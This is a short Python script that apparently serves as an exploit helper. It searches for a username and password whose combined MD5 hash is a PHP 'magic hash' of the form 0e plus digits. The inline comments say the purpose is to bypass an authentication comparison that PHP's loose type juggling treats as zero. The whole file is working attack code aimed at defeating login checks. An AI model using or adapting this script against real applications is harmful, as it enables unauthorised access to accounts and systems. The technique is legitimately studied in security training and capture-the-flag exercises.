import hashlib
import random as r
import exrex
import re

def generateRandomString(length):
    random_string = ''
    random_str_seq = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for i in range(0,length):
        if i % length == 0 and i != 0:
            random_string += '-'
        random_string += str(random_str_seq[r.randint(0, len(random_str_seq) - 1)])
    return random_string

magicHash = False
while not magicHash:
	# 1 - Generate a random name (8 chars)
	randomName = generateRandomString(8)
	
	# 2 - Generate a random password with the required pattern 
	randomPasswordWithPattern = exrex.getone("[\\d+]{2}[a-z+]{3}[A-Z+]{3}$")

	# 3 - Calculate the hash of compaining username + password 
	md5Hash = hashlib.md5((randomName + randomPasswordWithPattern).encode('utf-8')).hexdigest()

	# 4 - Compare if the resulted hash is a magic hash (php will treats magic hash as a float number, and we will bypass the comparision with the key - the key is 0 value)
	if re.match(r'0+[eE]\d+$', md5Hash):
		print ("Magic Hash is: "+ md5Hash)
		print("Random Name is : " + randomName)
		print("Random Password is : " + randomPasswordWithPattern)
		magicHash = True
